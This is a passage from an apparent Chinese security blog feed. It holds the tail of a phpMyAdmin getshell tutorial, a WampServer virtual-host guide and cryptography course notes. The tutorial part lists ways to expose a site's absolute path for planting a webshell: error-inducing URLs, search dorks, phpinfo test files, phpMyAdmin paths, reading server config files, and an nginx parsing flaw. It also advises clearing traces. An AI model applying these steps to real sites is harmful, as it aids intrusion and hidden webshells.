title="小结"></a>小结</h3><p>其实这样一套操作下来动静是很大的，要注意清除痕迹，另外在Windows7这类非服务器的系统上远程登录的话会挤掉当前用户，当然也可以使用工具让其支持多用户登录，具体就不详细说明了。</p><h2 id="0x04-php爆绝对路径方法"><a href="#0x04-php爆绝对路径方法" class="headerlink" title="0x04 php爆绝对路径方法"></a>0x04 php爆绝对路径方法</h2><p>插入一句话木马时是需要知道网站绝对路径的，这里总结一下爆路径的方法。</p><h3 id="单引号爆路径"><a href="#单引号爆路径" class="headerlink" title="单引号爆路径"></a>单引号爆路径</h3><p>直接在URL后面加单引号，要求单引号没有被过滤(gpc=off)且服务器默认返回错误信息。<br><code>www.xxx.com/news.php?id=1′</code></p><h3 id="错误参数值爆路径"><a href="#错误参数值爆路径" class="headerlink" title="错误参数值爆路径"></a>错误参数值爆路径</h3><p>将要提交的参数值改成错误值，比如-1。-99999单引号被过滤时不妨试试。<br><code>www.xxx.com/researcharchive.php?id=-1</code></p><h3 id="Google爆路径"><a href="#Google爆路径" class="headerlink" title="Google爆路径"></a>Google爆路径</h3><p>结合关键字和site语法搜索出错页面的网页快照，常见关键字有warning和fatal error。注意，如果目标站点是二级域名，site接的是其对应的顶级域名，这样得到的信息要多得多。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Site:xxx.edu.tw warning</span><br><span class="line">Site:xxx.com.tw “fatal error”</span><br></pre></td></tr></table></figure></p><h3 id="测试文件爆路径"><a href="#测试文件爆路径" class="headerlink" title="测试文件爆路径"></a>测试文件爆路径</h3><p>很多网站的根目录下都存在测试文件，脚本代码通常都是phpinfo()。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">www.xxx.com/test.php</span><br><span class="line">www.xxx.com/ceshi.php</span><br><span class="line">www.xxx.com/info.php</span><br><span class="line">www.xxx.com/phpinfo.php</span><br><span class="line">www.xxx.com/php_info.php</span><br><span class="line">www.xxx.com/1.php</span><br></pre></td></tr></table></figure></p><h3 id="phpmyadmin爆路径"><a href="#phpmyadmin爆路径" class="headerlink" title="phpmyadmin爆路径"></a>phpmyadmin爆路径</h3><p>一旦找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。至于phpmyadmin的地址可以用wwwscan这类的工具去扫，也可以选择google。</p><ol><li>/phpmyadmin/libraries/lect_lang.lib.php</li><li>/phpMyAdmin/index.php?lang[]=1</li><li>/phpMyAdmin/phpinfo.php</li><li>load_file()</li><li>/phpmyadmin/themes/darkblue_orange/layout.inc.php</li><li>/phpmyadmin/libraries/select_lang.lib.php</li><li>/phpmyadmin/libraries/lect_lang.lib.php</li><li>/phpmyadmin/libraries/mcrypt.lib.php</li></ol><h3 id="配置文件找路径"><a href="#配置文件找路径" class="headerlink" title="配置文件找路径"></a>配置文件找路径</h3><p>如果注入点有文件读取权限，就可以手工load_file或工具读取配置文件，再从中寻找路径信息（一般在文件末尾）。各平台下Web服务器和PHP的配置文件默认路径可以上网查，这里列举常见的几个。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Windows:</span><br><span class="line">c:\windows\php.ini php配置文件</span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml IIS虚拟主机配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">/etc/php.ini php配置文件</span><br><span class="line">/etc/httpd/conf.d/php.conf</span><br><span class="line">/etc/httpd/conf/httpd.conf Apache配置文件</span><br><span class="line">/usr/local/apache/conf/httpd.conf</span><br><span class="line">/usr/local/apache2/conf/httpd.conf</span><br><span class="line">/usr/local/apache/conf/extra/httpd-vhosts.conf 虚拟目录配置文件</span><br></pre></td></tr></table></figure></p><h3 id="nginx文件类型错误解析爆路径"><a href="#nginx文件类型错误解析爆路径" class="headerlink" title="nginx文件类型错误解析爆路径"></a>nginx文件类型错误解析爆路径</h3><p>说明：<br>要求Web服务器是nginx，且存在文件类型解析漏洞。有时在图片地址后加/x.php，该图片不但会被当作php文件执行，有可能爆出物理路径<br><code>www.xxx.com/xx.jpg/x.php</code></p><h2 id="0x05-思考"><a href="#0x05-思考" class="headerlink" title="0x05 思考"></a>0x05 思考</h2><p>此次是在Windows系统下的实验，如果是Linux是否同样可以利用日志写shell？<br>于是找了个linux服务器测试<br><img src="/2018/10/11/phpmyadmin-getshell姿势/1542109780138.png" alt="Alt text"><br>可以发现，我们没有权限在网站目录下创建日志文件。因为此台服务器上MYSQL并没有被赋予在站点根目录下创建文件的权限。所以也无法写shell并解析。</p><p>因此，只要做好权限把控，就可以避免此类安全问题</p><blockquote><p>参考文章<br><a href="http://www.4hou.com/system/8314.html" target="_blank" rel="external">http://www.4hou.com/system/8314.html</a><br><a href="http://www.cnblogs.com/devi1o/articles/5179206.html" target="_blank" rel="external">http://www.cnblogs.com/devi1o/articles/5179206.html</a><br><a href="https://zhuanlan.zhihu.com/p/25957366" target="_blank" rel="external">https://zhuanlan.zhihu.com/p/25957366</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文首发于&lt;a href=&quot;https://xz.aliyun.com/t/3283&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;先知社区&lt;/a&gt;,转载请注明来源&lt;/p&gt;
&lt;p&gt;phpmyadmin常被用来管理mysql数据库。在ctf比赛和实战中都可能
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://www.twosmi1e.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>WampServer多端口配置</title>
    <link href="https://www.twosmi1e.com/2018/10/04/WampServer%E5%A4%9A%E7%AB%AF%E5%8F%A3%E9%85%8D%E7%BD%AE/"/>
    <id>https://www.twosmi1e.com/2018/10/04/WampServer多端口配置/</id>
    <published>2018-10-03T16:49:05.000Z</published>
    <updated>2018-10-03T16:50:25.531Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>做项目有的文件必须放在网站根目录，于是需要配置多端口，找了网上几种方法都没成功，记下最后成功的办法。</p><h2 id="0x01-修改http-conf"><a href="#0x01-修改http-conf" class="headerlink" title="0x01  修改http.conf"></a>0x01  修改http.conf</h2><p>在监听端口处加<code>Listen 端口号</code><br>example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#Listen 12.34.56.78:80</span><br><span class="line">Listen 0.0.0.0:90</span><br><span class="line">Listen [::0]:90</span><br><span class="line">Listen 9090</span><br></pre></td></tr></table></figure></p><h2 id="0x02-开启虚拟站点"><a href="#0x02-开启虚拟站点" class="headerlink" title="0x02 开启虚拟站点"></a>0x02 开启虚拟站点</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Virtual hosts </span><br><span class="line">#Include conf/extra/httpd-vhosts.conf</span><br></pre></td></tr></table></figure><p>去掉注释符  修改为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Virtual hosts </span><br><span class="line">Include conf/extra/httpd-vhosts.conf</span><br></pre></td></tr></table></figure></p><h2 id="0x03-配置conf-extra-httpd-vhosts-conf"><a href="#0x03-配置conf-extra-httpd-vhosts-conf" class="headerlink" title="0x03 配置conf/extra/httpd-vhosts.conf"></a>0x03 配置conf/extra/httpd-vhosts.conf</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:9090&gt;</span><br><span class="line">ServerName test01.com</span><br><span class="line">DocumentRoot D:/demo/test01</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><p>最后重启 访问端口就行了<br>更详细的配置版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:8082&gt; </span><br><span class="line">ServerAdmin webmaster@dummy-host.localhost </span><br><span class="line">DocumentRoot &quot;C:/PhpDocRoot/Site1&quot; </span><br><span class="line">ServerName localhost </span><br><span class="line">ServerAlias localhost </span><br><span class="line">ErrorLog &quot;logs/dummy-host.localhost-error.log&quot; </span><br><span class="line">CustomLog &quot;logs/dummy-host.localhost-access.log&quot; common </span><br><span class="line">&lt;Directory &quot;C:/PhpDocRoot/Site1&quot;&gt; </span><br><span class="line">Options Indexes FollowSymLinks </span><br><span class="line">AllowOverride None </span><br><span class="line">Order allow,deny </span><br><span class="line">Allow from all </span><br><span class="line">&lt;/Directory&gt; </span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;做项目有的文件必须放在网站根目录，于是需要配置多端口，找了网上几种方法都没成功，记下最后成功的办法。
      
    
    </summary>
    
    
      <category term="php" scheme="https://www.twosmi1e.com/tags/php/"/>
    
      <category term="编程相关" scheme="https://www.twosmi1e.com/tags/%E7%BC%96%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
  </entry>
  
  <entry>
    <title>密码学</title>
    <link href="https://www.twosmi1e.com/2018/09/06/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    <id>https://www.twosmi1e.com/2018/09/06/密码学/</id>
    <published>2018-09-06T05:26:06.000Z</published>
    <updated>2018-10-11T08:02:21.375Z</updated>
    
    <content type="html"><![CDATA[<h1 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h1><h2 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h2><h3 id="密码学体制"><a href="#密码学体制" class="headerlink" title="密码学体制"></a>密码学体制</h3><p>1.明文空间M（全体明文的集合）<br>2.密文空间C（全体密文的集合）<br>3.密钥空间K（全体密钥的集合）<br>4.加密器或加密变换（算法）E<br>5.揭秘其或解密变换（算法）D<br>&#123;M，C，K，E，D&#125;称为一个密码体制</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>按执行的操作方式不同可分为替换密码体制和换位密码体制<br>按收发双方使用的密钥是否相同可分为对称密码和非对称密码<br>分组密码和序列密码<br>单项变换密码体制和双向变换密码体制<br>确定型密码体制和概率密码体制</p><h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><ul><li>唯密文攻击：已知一些密文和加密算法</li><li>已知明文攻击：已知一些密文和加密算法以及对应的明文</li><li>选择明文攻击：已知加密算法，选择明文得到相应密文，也可选择被加密的明文推导密钥和算法</li><li>选择密文攻击：已知加密算法，选择不同的密文以及相应的被解密的明文</li><li>选择文本攻击：明文与密文结合，前两种方法的结合</li></ul><p>唯密文攻击最难，攻击强度递增。一个密码体制安全通常指在前三种攻击下安全</p><p>RSA：能抵御选择明文<br>AES：能抵御已知明文<br>DES：密钥太短，不能抵御已知</p><h2 id="第二章"><a href="#第二章" class="headerlink" title="第二章"></a>第二章</h2><h4 id="仿射密码"><a href="#仿射密码" class="headerlink" title="仿射密码"></a>仿射密码</h4><p>仿射密码是一种替换密码<br>k和26互质</p><p>i为明文 j为明文<br>（1）加密变换为：Ek0，k1（ai）=aj，j=（ik1+ k0）（mod n），k0 ,k1∈Zn，gcd(k1，n)=1；<br>（2）解密变换为：Dk0，k1（aj）=ai，i= k1<sup>-1</sup>（j-k0）（mod n），k0 ,k1∈Zn，gcd(k1，n)=1，其中：k1-1是k1关于n的逆元，即k1-1×k1＝1 (mod n)<br>（3）k1，k0为该算法的密钥。当k0=0时，仿射密码技术退化为乘法密码技术；当k0=1时，仿射密码技术退化为移位替换密码技术。<br><img src="/2018/09/06/密码学/1526881719267.png" alt="Alt text"></p><h4 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h4><p>（1）加密<br>明文M=(m1, m2, …, mn)被分为长度为d的字母段，如果消息的长度恰好不是d的倍数，则在末尾填充随机字符。加密函数为：<br>Ek(m1, m2, …, mn)=((m1+k1) mod 26，(m2+k2) mod 26，…， (mn+kn)) mod 26  = c1, c2, …, cn</p><p>（2）解密<br>解密函数Dk和加密函数Ek一样，只是运算时使用的是减法而不是加法，假设密文C=(c1, c2, …, cn)，则解密函数为：<br>Dk(c1, c2, …, cn)=((c1-k1) mod 26，(c2-k2) mod 26，…，(cn-kn) mod 26 = m1, m2, …, mn<br><img src="/2018/09/06/密码学/1526882755939.png" alt="Alt text"><br>（3）密钥<br>对于Vigenere密码，密钥是一个字符序列k=( k1, k2, …, kn)，其中k1=k2= …= kn（它们是长度为d的英文字串），n为任意值。因此，在原理上存在无限多个密钥。在实际应用中，当密钥的长度比明文短时，密钥可以周期性地重复使用（即k=( k1, k2, …, kn)），直至完成明文中每个字母的加密。<br><img src="/2018/09/06/密码学/1526882774380.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526882789986.png" alt="Alt text"></p><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><h3 id="DES算法"><a href="#DES算法" class="headerlink" title="DES算法"></a>DES算法</h3><p>DES加密和解密是互逆的<br>DES的<strong>明文分组长度64 bits</strong>，密钥长度为64 bits，其中密钥有8 bits奇偶校验，因此<strong>有效密钥</strong>长度为<strong>56 bits</strong>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">st=&gt;start: 64位明文</span><br><span class="line">e=&gt;end: 64位密文</span><br><span class="line">op1=&gt;operation: 初始置换IP</span><br><span class="line">op2=&gt;operation: 16轮乘积变换</span><br><span class="line">op3=&gt;operation: 逆初始置换IP^-1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">st-&gt;op1-&gt;op2-&gt;op3-&gt;e</span><br></pre></td></tr></table></figure></p><p><img src="/2018/09/06/密码学/1526902503466.png" alt="Alt text"></p><h4 id="IP置换"><a href="#IP置换" class="headerlink" title="IP置换"></a>IP置换</h4><p>IP置换表：<br><img src="/2018/09/06/密码学/1527074953574.png" alt="Alt text"></p><p><img src="/2018/09/06/密码学/1527074924697.png" alt="Alt text"></p><h4 id="S盒使用方法"><a href="#S盒使用方法" class="headerlink" title="S盒使用方法"></a>S盒使用方法</h4><p>接收6比特的输入，第1和最后1比特构成的2位二进制位行号，中间4位二进制位列号，查S盒得到输出并转化为二进制</p><h4 id="E盒扩展"><a href="#E盒扩展" class="headerlink" title="E盒扩展"></a>E盒扩展</h4><p>对输入的某些位进行复制和置换，将32 bits扩展为48 bits。<img src="/2018/09/06/密码学/1526902478091.png" alt="Alt text"></p><h4 id="三重DES"><a href="#三重DES" class="headerlink" title="三重DES"></a>三重DES</h4><p>DES-EDE2<br><img src="/2018/09/06/密码学/1526902435581.png" alt="Alt text"></p><p>DES-EEE2<br><img src="/2018/09/06/密码学/1526902401769.png" alt="Alt text"></p><p>EDE3，EEE3密钥长度为168bits  EDE2，EEE2为112bits</p><h3 id="AES算法"><a href="#AES算法" class="headerlink" title="AES算法"></a>AES算法</h3><p>限定了明文分组为128bits，而密钥长度可为128、192、256bits，因而实际上AES有三个版本：AES-128、AES-192、AES-256，相应的迭代轮数为10轮、12轮、14轮。<br><img src="/2018/09/06/密码学/1526902679329.png" alt="Alt text"><br>字节代替(SubBytes)：通过一个非线性的替换函数，用查找表（S盒）的方式把每个字节替换成对应字节（前4bit行值，后4bit列值）<br>行移位(ShiftRows)：将矩阵中每个横列进行循环式移位<br>列混合(MixColumns)：使用线性转换混合每行内的四个字节<br>轮密钥加(AddRoungKey)：矩阵中每个字节都与该次循环的子密钥做异或XOR运算</p><h4 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h4><p><img src="/2018/09/06/密码学/1526906503013.png" alt="Alt text"><br>首先初始密钥按照矩阵列进行分许，前4列记为$K_0$,$K_1$,$K_2$,$K_3$<br>1.若$K_i$中，i不是4的倍数，则<br>K<sub>i</sub> = K<sub>i-4</sub>XOR K<sub>i-1</sub><br>2.若$K_i$中，i是4的倍数，则<br>K<sub>i</sub>=K<sub>i-4</sub>XOR T[K<sub>i-1</sub>]</p><p>T[K<sub>i-1</sub>]:<br>1.循环地将K<sub>i-1</sub>的元素左移位，每次一个字节，如abcd-&gt;bcda；<br>2.将这4个字节作为S盒的输入，输出新的4个字节 efgh<br>3.计算一轮的常量r(i)=2<sup>(i-4)/4</sup><br>4.生成转换后的列：[e XOR r(i), f, g, h]</p><p>例： $𝑇(𝐾_3)$的计算步骤如下：<br>1）循环将$𝐾_3$按照字节为单位循环左移1字节，00 55 09 32变成55 09 32 00<br>2）将55 09 32 00作为S盒的输入，查表得到输出FC 01 23 63<br>3）查找Rcon表，$Rcon[i/ Nk]=Rcon[1]=01000000$<br>4）将01000000与FC 01 23 63异或运算得FD 01 23 63<br>因此$𝑇(𝐾_3 )$=&#123;FD 01 23 63&#125;</p><p><img src="/2018/09/06/密码学/1526908943971.png" alt="Alt text"></p><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><p><img src="/2018/09/06/密码学/1526906778038.png" alt="Alt text"></p><h4 id="AES字节基本运算"><a href="#AES字节基本运算" class="headerlink" title="AES字节基本运算"></a>AES字节基本运算</h4><p>AES算法的基本运算是在有限域$GF(2^8)$上的加与乘运算。AES算法构造有限域选择的不可约多项式是$p(x)=x^8+x^4+x^3+x+1$<br>余式的次数至多是7次，共28=256个多项式，这256个余式构成了一个有限域。<br><strong>重要规则：系数模2 模p(x)</strong></p><p><strong>X乘</strong><br>另外 GF(28)上域元素 x，用二进制表示为&#123;0000 0010&#125;。用十六进制表示为&#123;02&#125;.<br>因此若b7=0 ，可以得出x•b(x)的结果就是 b(x)对应的8bits二进制向左移一位，最后一位补0。<br><img src="/2018/09/06/密码学/1526910903114.png" alt="Alt text"></p><p>若b7=1, x•b(x)的结果就是b(x)对应的8bits二进制向左移一位，最后一位补0，再与&#123;1B&3125;（其二进制为00011011，多项式表示为x4+x3+x+1）做逐比特异或来实现。<br><img src="/2018/09/06/密码学/1526910914734.png" alt="Alt text"></p><h3 id="对称密码工作体制"><a href="#对称密码工作体制" class="headerlink" title="对称密码工作体制"></a>对称密码工作体制</h3><h4 id="ECB电子码本模式"><a href="#ECB电子码本模式" class="headerlink" title="ECB电子码本模式"></a>ECB电子码本模式</h4><p>ECB操作模式加密： $C_j=E_k(P_j)$<br>ECB操作模式解密： $P_j=D_k(C_j)$</p><p><img src="/2018/09/06/密码学/1526911074509.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526911078440.png" alt="Alt text"><br>（1）ECB运行模式在给定的密钥下，同一明文组总产生同样的密文组。<br>（2）无链接依赖性，各组的加密独立于其它分组，重排密文分组，将导致相应的明文分组重排。<br>（3）<strong>无错误传播</strong>，单个密文分组中有一个或多个比特错误只会影响该分组的解密结果。<br>（4）<strong>安全性有限</strong>，由于同一明文产生同样的密文，这会暴露明文数据的格式和统计特征。特别是若明文数据都有固定的格式（例如图像）或者并需要以协议的形式定义的数据，一些重要的数据常常在同一位置上出现，使密码分析者可以对其进行统计分析、重传和代换攻击。因此当消息长度超过一个组或者重复使用密钥加密多个单组消息，不建议使用ECB模式</p><h4 id="CBC密码分组链接模式"><a href="#CBC密码分组链接模式" class="headerlink" title="CBC密码分组链接模式"></a>CBC密码分组链接模式</h4><p>CBC操作模式加密： $C_j=E_K(C_j-1 ⊕P_j)$<br>CBC操作模式解密： $P_j=D_K(C_j) ⊕C_j-1$<br><img src="/2018/09/06/密码学/1526911566304.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526911576629.png" alt="Alt text"><br>（1）能够隐蔽明文数据的<strong>格式规律</strong>和<strong>统计特性</strong>，相同的明文分组产生不同密文分组。<br>（2）在一定程度上能够识别攻击者在密文传输中是否对数据进行了篡改，如组的重放、嵌入和删除等。<br>（3）CBC模式各密文分组不仅与当前明文组有关，而且通过反馈作用还与以前的明文组有关。在CBC模式下，最好是每发一个消息，都改变IV，比如将其值加一，这样即使是两个相同的明文使用相同的密钥，也将产生不同的密文，这样大大提供了安全性。但这样产生另外一个问题，接收端（解密方）如何知道使用的IV呢？实际上，<strong>IV的完整性要比其保密性更为重要</strong>。<br>（4）具有错误传播. 若在传送过程中，<strong>某组密文组Cj出错时，则会影响到分组Cj 和Cj+1 的解密</strong>, 即该组恢复的明文 和下一组 恢复数据出错。但后面的分组解密将不会受影响。<br>（5）在CBC模式中，密文分组若某些<strong>比特缺失</strong>（例如某些比特位没有收到等），那么即使密文分组中1 bit的缺失，也会导致后续密文分组都受缺失影响，从而此自缺失比特密文分组开始，后续密文分组全部受缺失影响，无法正常解密</p><h4 id="CFB密码反馈模式"><a href="#CFB密码反馈模式" class="headerlink" title="CFB密码反馈模式"></a>CFB密码反馈模式</h4><p><img src="/2018/09/06/密码学/1526911806064.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526911822585.png" alt="Alt text"><br>例：<br><img src="/2018/09/06/密码学/1526911892569.png" alt="Alt text"><br>（1）输入相同明文，改变IV会导致相同的明文输入得到不同的加密输出，<strong>IV无需保密</strong>。若待加密消息必须按字符(如电传电报)或按比特处理时，可采用CFB模式。CFB实际上是将加密算法DES作为一个密钥流产生器。CFB模式除能获得保密性外，<strong>对错误差错比较敏感</strong>，还能用于认证。<br>（2）CFB与CBC的区别是反馈的密文长度为j，且不是直接与明文操作，而是反馈至密钥产生器。解密采用相同方案，都使用加密函数而非解密函数。密文分组$𝐶<em>𝑖$依赖于$𝑃</em>𝑖$和前面的所有明文分组，因此正确的解密一个正确的密文分组需要之前的⌈𝑛/𝑗⌉个密文分组也都正确（<strong>确保移位寄存器是正确的</strong>）。<br>（3）在CFB模式中，明文有一组$𝑃<em>𝑖$中单个比特有错，会使以后的密文组都受影响，但经解密后的恢复结果，除原有误的一组外，其后各组明文都正确地恢复。<br>若在传送过程中，一个或多个比特错误出现在j比特的密文组$𝐶</em>𝑖$中，<strong>则会影响到分组</strong>$𝑪<em>𝒊$<strong>和后续⌈𝒏/𝒋⌉个密文分组的解密</strong>（直到nbits的密文被处理，在此之后出错的分组$𝐶</em>𝑖$完全移出移位寄存器）。例如对于8bits（1个字节）的加密，则会产生9字节的错误。</p><h4 id="OFB输出反馈模式"><a href="#OFB输出反馈模式" class="headerlink" title="OFB输出反馈模式"></a>OFB输出反馈模式</h4><p><img src="/2018/09/06/密码学/1526912300183.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526912307757.png" alt="Alt text"><br>（1）与CFB、CBC相同，输入相同明文，改变IV会导致相同的明文输入得到不同的密文输出。<br>  （2）OFB模式的传输过程中的<strong>比特错误不会被传播</strong>。例如$𝐶<em>𝑖$中出现一个或多个比特错误，在解密结果中只有$𝑃</em>𝑖$受到影响，以后各明文分组则不受影响。但与CFB模式相比，<strong>更易受到对消息流的篡改攻击</strong>，比如在密文中取1bit的补，那么在恢复的明文中相应位置的比特也为原比特的补。因此使得敌手有可能通过对消息校验部分的篡改和对数据部分的篡改，而以纠错码不能检测的方式篡改，因此对于密文被篡改难以进行检测，无法实现完整性检测。</p><h4 id="CTR计数器模式"><a href="#CTR计数器模式" class="headerlink" title="CTR计数器模式"></a>CTR计数器模式</h4><p>CTR操作模式加密： $O_i=E_k(CTR+i-1)，C_i=O_i⊕P_i$<br>CTR操作模式解密：$O_i=E_k(CTR+i-1) ，P_i=O_i⊕ C_i$</p><p><img src="/2018/09/06/密码学/1526917146239.png" alt="Alt text"><br><img src="/2018/09/06/密码学/1526917135624.png" alt="Alt text"></p><h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><h3 id="序列密码分类"><a href="#序列密码分类" class="headerlink" title="序列密码分类"></a>序列密码分类</h3><p>在序列密码中，根据状态函数是否独立于明文或密文，可以将序列密码分为同步序列密码和自同步序列密码两类。</p><h4 id="同步序列密码"><a href="#同步序列密码" class="headerlink" title="同步序列密码"></a>同步序列密码</h4><p>密钥流独立于消息流产生 。加密端密钥流发生器一位接一位地产生密钥，在解密端发生器产生出完全相同的密钥。<br>同步密钥流生成器模型特点：<br>（1）<strong>同步</strong>：在一个同步序列中，发送方和接收方必须是同步的，即用同样的密钥且该密钥操作在同样的位置（状态），才能保证正确的解密。<br>（2）<strong>无错误传播</strong>：在传输期间，一个密文字（或位）被改变（不是删除和插入）只能影响该密文字（或位）的恢复，不会对后续密文字（或位）产生影响。<br>（3）<strong>主动攻击破坏同步</strong>：按照同步要求，一个主动攻击对密文进行插入、删除或重放操作都会立即破坏其同步，从而可能被解密器检测出来。作为无错误传播的结果，主动攻击者可能有选择地对密文进行改动，并准确地知道这些改动对明文的影响，这时可以采用为数据源提供认证并保证数据完整性的技术。</p><h4 id="自同步序列密码"><a href="#自同步序列密码" class="headerlink" title="自同步序列密码"></a>自同步序列密码</h4><p>也称为异步流密码，密钥流的产生<strong>不是独立于</strong>明文流和密文流的。<br><img src="/2018/09/06/密码学/1526918362792.png" alt="Alt text"><br>自同步密钥流生成器模型特点：<br>（1）<strong>自同步</strong>：自同步的实现依赖于密文字被删除或插入，这是因为解密只取决于先前固定数量的密文字。自同步序列密码在同步丢失后能够自动重新建立同步，并正确地解密，只有固定数量的明文字不能解密。<br>（2）<strong>有限的错误传播</strong>：因为自同步序列的状态取决于t个已有的密文字符，若一个密文字（或位）在传输过程中被修改（插入或删除），则解密时最多只影响到后续 t个密文字的解密，即只发生有限的错误传播。<br>（3）<strong>难检测主动攻击</strong>：相比于同步，自同步使得主动攻击者发起的对密文字的插入、删除、重放等攻击只会产生非常有限的影响，正确的解密能很快自动重建。因此，主动攻击对自同步序列密码很困难的，可能需要采用为数据源提供认证并保证数据完整性的技术。有限的错误传播特性使得主动攻击者对密文字的任何改动都会引起一些密文字解密出错。<br>（4）<strong>密文统计扩散</strong>：每个明文字都会影响其后的整个密文，即密文的统计特性被扩散到密文中。所以，自同步序列密码体制在抵抗利用明文冗余度而发起的攻击方面要强于同步序列密码。</p><h3 id="LFSR线性反馈移位寄存器"><a href="#LFSR线性反馈移位寄存器" class="headerlink" title="LFSR线性反馈移位寄存器"></a>LFSR线性反馈移位寄存器</h3><p>移位寄存器是流密码产生密钥流的一个主要组成部分。GF(2)上一个n级反馈移位寄存器由n个二元存储器与一个反馈函数$f(a_1,a_2,…,a_n)$组成<br><img src="/2018/09/06/密码学/1526918733978.png" alt="Alt text"></p><p>1.n级线性反馈移位寄存器的<strong>状态周期小于等于2n-1</strong>。<br>2.周期达到最大值$2^n-1$时，称&#123;a<sub>i</sub>&#125;为n级m序列。<br>3.n级LFSR产生的序列有最大周期$2^n-1$的必要条件是其特征多项式为不可约多项式。<br>4.若n次不可约多项式p(x)的阶$2^n-1$，则称其为n次本原多项式。<br>5.设p(x)是GF(2)上的多项式，使p(x)|(x<sup>p</sup>-1)的最小的p称为p(x)的周期或阶</p><h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><h3 id="非对称密码概述"><a href="#非对称密码概述" class="headerlink" title="非对称密码概述"></a>非对称密码概述</h3><p><strong>分组密码和序列密码都属于对称密码体制</strong></p><p><img src="/2018/09/06/密码学/1526921469503.png" alt="Alt text"></p><p>（1）主体A若需要其他主体利用非对称密码体制向他发送秘密消息，先要生成<strong>一对密钥</strong>，其中一个用于加密，另一个用于解密。用于<strong>加密的密钥</strong>在非对称密码体制中称为公开密钥，也称公开钥或公钥，是<strong>不需要保密</strong>的。A的公开密钥通常表示为PKA(public key of A)。用于解密的密钥称为秘密密钥，简称秘密钥或私钥，需要解密方<strong>严格保密</strong>。B的秘密密钥通常表示为SKA(secret key of A)。<br>（2）B若要向A发送秘密消息m(message)，先要获取A的<strong>加密密钥</strong>，也即<strong>公钥</strong>。计算c=𝐸<sub>𝑃𝐾<sub>𝐴 </sub></sub> (𝑚) ，得到消息m对应的密文c(cipher)，然后把c发送给A。其中c 表示加密消息得到的密文，E(Encrypt)表示对消息进行加密的算法。𝐸<sub>𝑃𝐾<sub>𝐴</sub></sub>  (𝑚)表示用加密算法E和公开密钥PK<sub>A</sub>对消息m进行加密。<br>（3）A在接收到密文c后，计算𝑚=𝐷<sub>𝑆𝐾<sub>𝐴</sub></sub> (𝑐)  , 得到密文c对应的消息m。其中D(Decrypt)表示对密文进行<strong>解密</strong>的算法，𝐷<sub>𝑆𝐾<sub>𝐴</sub></sub> 